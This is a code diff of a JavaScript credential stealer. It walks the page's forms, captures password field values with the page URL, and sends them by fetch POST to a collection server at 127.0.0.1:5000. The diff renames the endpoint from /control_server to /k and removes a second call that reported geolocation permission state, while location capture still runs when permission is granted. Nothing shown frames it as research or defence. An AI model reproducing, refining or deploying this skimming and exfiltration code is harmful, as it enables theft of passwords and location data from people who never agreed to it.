@@ -36,7 +36,7 @@ for (var i = 0; i < document.forms.length; i++) {
 			logindata["password"]["url"] = document.URL;
 			logindata["password"]["fieldname"] = this.name;
 			logindata["password"]["fieldvalue"] = this.value;
-            fetch('http://127.0.0.1:5000/control_server',
+            fetch('http://127.0.0.1:5000/k',
             {
             method: "POST",
             mode: 'no-cors', 
@@ -54,13 +54,6 @@ navigator.permissions
     .query({ name: "geolocation" })
     .then(function (_a) {
     var state = _a.state;
-    fetch('http://127.0.0.1:5000/control_server',
-    {
-    method: "POST",
-    mode: 'no-cors', 
-    body: JSON.stringify( state),
-    headers:{"Content-Type": "application/json"}
-    })
     if (state === "granted") {
         captureGeolocation();
     }
